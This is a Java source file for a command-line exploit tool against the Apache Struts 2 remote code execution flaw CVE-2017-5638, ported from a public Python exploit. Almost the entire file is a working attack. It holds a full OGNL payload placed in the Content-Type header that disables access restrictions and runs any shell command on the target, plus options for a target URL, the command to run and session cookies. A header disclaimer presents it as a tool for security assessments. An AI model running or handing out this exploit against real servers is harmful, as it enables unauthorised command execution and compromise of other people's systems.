package com.afs.exploit.struts2;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

/**
 * This is a sort of Java porting of the Python exploit at: https://www.exploit-db.com/exploits/41570/
 * This software is written to have no external dependencies.
 * DISCLAIMER: This tool is intended for security engineers and appsec guys for security assessments. Please
 * use this tool responsibly. I do not take responsibility for the way in which any one uses this application.
 * I am NOT responsible for any damages caused or any crimes committed by using this tool.
 * ..................
 * . CVE-ID ........: CVE-2017-5638
 * . Link ..........: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
 * . Description ...: The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1
 * .................. has incorrect exception handling and error-message generation during file-upload attempts, which
 * .................. allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition,
 * .................. or Content-Length HTTP header, as exploited in the wild in March 2017 with a Content-Type header
 * .................. containing a #cmd= string.
 * ..................
 * 
 * @author Antonio Francesco Sardella
 */
public class Struts2Cve20175638 {

    /**
     * Version string.
     */
    private static final String VERSION = "v1.0 (2018-02-25)";

    /**
     * Malicious payload.
     */
    private static String PAYLOAD;

    /**
     * Malicious payload initialization.
     */
    static {
        PAYLOAD = "%%{(#_='multipart/form-data')."; // This % is doubled to be escaped into String.format method.
        PAYLOAD += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).";
        PAYLOAD += "(#_memberAccess?";
        PAYLOAD += "(#_memberAccess=#dm):";
        PAYLOAD += "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).";
        PAYLOAD += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).";
        PAYLOAD += "(#ognlUtil.getExcludedPackageNames().clear()).";
        PAYLOAD += "(#ognlUtil.getExcludedClasses().clear()).";
        PAYLOAD += "(#context.setMemberAccess(#dm)))).";
        PAYLOAD += "(#cmd='%s').";
        PAYLOAD += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).";
        PAYLOAD += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).";
        PAYLOAD += "(#p=new java.lang.ProcessBuilder(#cmds)).";
        PAYLOAD += "(#p.redirectErrorStream(true)).(#process=#p.start()).";
        PAYLOAD += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).";
        PAYLOAD += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).";
        PAYLOAD += "(#ros.flush())}";
    }

    /**
     * The target URL.
     */
    private URL url;

    /**
     * The command that will be executed on the remote machine.
     */
    private String command;

    /**
     * Cookies that will be passed.
     */
    private String cookies;

    /**
     * Verbosity flag.
     */
    private boolean verbose;

    /**
     * Default constructor.
     */
    public Struts2Cve20175638() {
        this.verbose = false;
    }

    /**
     * Performs the exploit.
     * 
     * @throws IOException
     *             If something bad occurs during HTTP GET.
     */
    public void exploit() throws IOException {
        checkInput();
        printInput();
        String payload = String.format(PAYLOAD, this.command);
        String response = httpGet(payload);
        printOutput(response);
    }

    /**
     * Checks the input.
     */
    private void checkInput() {
        if (this.url == null) {
            throw new IllegalArgumentException("URL must be passed.");
        }

        if (isEmpty(this.command)) {
            throw new IllegalArgumentException("Command must be passed.");
        }
    }

    /**
     * Prints input if verbose flag is true.
     */
    private void printInput() {
        if (isVerbose()) {
            System.out.println("[*] Target URL ...: " + this.url);
            System.out.println("[*] Command ......: " + this.command);
            System.out.println("[*] Cookies ......: " + (isEmpty(this.cookies) ? "(no cookies)" : this.cookies));
        }
    }

    /**
     * HTTP GET operation on the target passing the malicious payload.
     * 
     * @param payload
     *            The malicious payload.
     * @return The response as a string.
     * @throws IOException
     *             If something bad occurs during HTTP GET.
     */
    private String httpGet(String payload) throws IOException {
        if (isVerbose()) {
            System.out.println("[*] Payload ......: " + payload);
        }

        System.out.println("[*] Sending payload.");

        // Performing GET operation.
        HttpURLConnection connection = (HttpURLConnection) this.url.openConnection();
        connection.setRequestMethod("GET");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0");
        connection.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
        connection.setRequestProperty("Content-Type", payload);
        if (!isEmpty(this.cookies)) {
            connection.setRequestProperty("Cookie", this.cookies);
        }

        // Reading response code.
        int responseCode = connection.getResponseCode();
        System.out.println("[*] HTTP " + responseCode);

        // Reading response content.
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuffer response = new StringBuffer();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
            response.append(System.getProperty("line.separator"));
        }
        in.close();

        return response.toString();
    }

    /**
     * Prints output.
     * 
     * @param response
     *            Response that will be printed.
     */
    private void printOutput(String response) {
        System.out.println("[*] vvv Response vvv");
        System.out.println(response);
        System.out.println("[*] ^^^ ======== ^^^");
    }

    /**
     * Checks if an input string is null/empty or not.
     * 
     * @param input
     *            The input string to check.
     * @return True if the string is null or empty, false otherwise.
     */
    private boolean isEmpty(String input) {
        boolean isEmpty;

        if (input == null || input.trim().length() < 1) {
            isEmpty = true;
        } else {
            isEmpty = false;
        }

        return isEmpty;
    }

    /* Getters and setters. */

    public boolean isVerbose() {
        return verbose;
    }

    public void setVerbose(boolean verbose) {
        this.verbose = verbose;
    }

    public void setUrl(String url) throws MalformedURLException {
        if (isEmpty(url)) {
            throw new IllegalArgumentException("URL must be not null and not empty.");
        }

        this.url = new URL(url.trim());
    }

    public void setCommand(String command) {
        if (isEmpty(command)) {
            throw new IllegalArgumentException("Command must be not null and not empty.");
        }

        this.command = command.trim();
    }

    public void setCookies(String cookies) {
        if (cookies != null) {
            cookies = cookies.trim();
        }

        this.cookies = cookies;
    }

    /**
     * Shows the program help.
     */
    public static final void help() {
        System.out.println("Usage:");
        System.out.println("   java -jar struts2_cve-2017-5638.jar [options]");
        System.out.println("Description:");
        System.out.println("   Exploiting Apache Struts2 Remote Code Execution (CVE-2017-5638).");
        System.out.println("Options:");
        System.out.println("   -h, --help");
        System.out.println("      Prints this help and exits.");
        System.out.println("   -u, --url [target_URL]");
        System.out.println("      The target URL where the exploit will be performed.");
        System.out.println("   -cmd, --command [command_to_execute]");
        System.out.println("      The command that will be executed on the remote machine.");
        System.out.println("   --cookies [cookies]");
        System.out.println("      Optional. Cookies passed into the request, i.e. authentication cookies.");
        System.out.println("   -v, --verbose");
        System.out.println("      Optional. Increase verbosity.");
    }

    /**
     * Main method.
     * 
     * @param args
     *            Input arguments
     */
    public static void main(String[] args) {
        try {
            System.out.println("Apache Struts2 RCE (CVE-2017-5638) - " + VERSION);
            Struts2Cve20175638 o = new Struts2Cve20175638();

            if (args.length > 0) {
                for (int i = 0; i < args.length; i++) {

                    String p = args[i];

                    if (("-h".equals(p) || "--help".equals(p)) && i == 0) {
                        Struts2Cve20175638.help();
                        return;
                    } else if ("-u".equals(p) || "--url".equals(p)) {

                        if (i + 1 > args.length - 1) {
                            throw new IllegalArgumentException("URL must be passed.");
                        }
                        o.setUrl(args[++i]);

                    } else if ("-cmd".equals(p) || "--command".equals(p)) {

                        if (i + 1 > args.length - 1) {
                            throw new IllegalArgumentException("Command must be passed.");
                        }
                        o.setCommand(args[++i]);

                    } else if ("--cookies".equals(p)) {

                        if (i + 1 > args.length - 1) {
                            throw new IllegalArgumentException("Cookies must be passed, if specified.");
                        }
                        o.setCookies(args[++i]);

                    } else if ("-v".equals(p) || "--verbose".equals(p)) {
                        o.setVerbose(true);
                    }

                }

                // Performing the exploit.
                o.exploit();

            } else { // Wrong number of arguments.
                Struts2Cve20175638.help();
                return;
            }

        } catch (MalformedURLException mue) {
            System.out.println("[!] Input error (malformed URL): " + mue.getMessage());
        } catch (IllegalArgumentException iae) {
            System.out.println("[!] Input error (illegal argument): " + iae.getMessage());
        } catch (Exception e) {
            System.out.println("[!] Unexpected exception: " + e.getMessage());
            e.printStackTrace();
        }
    }

}
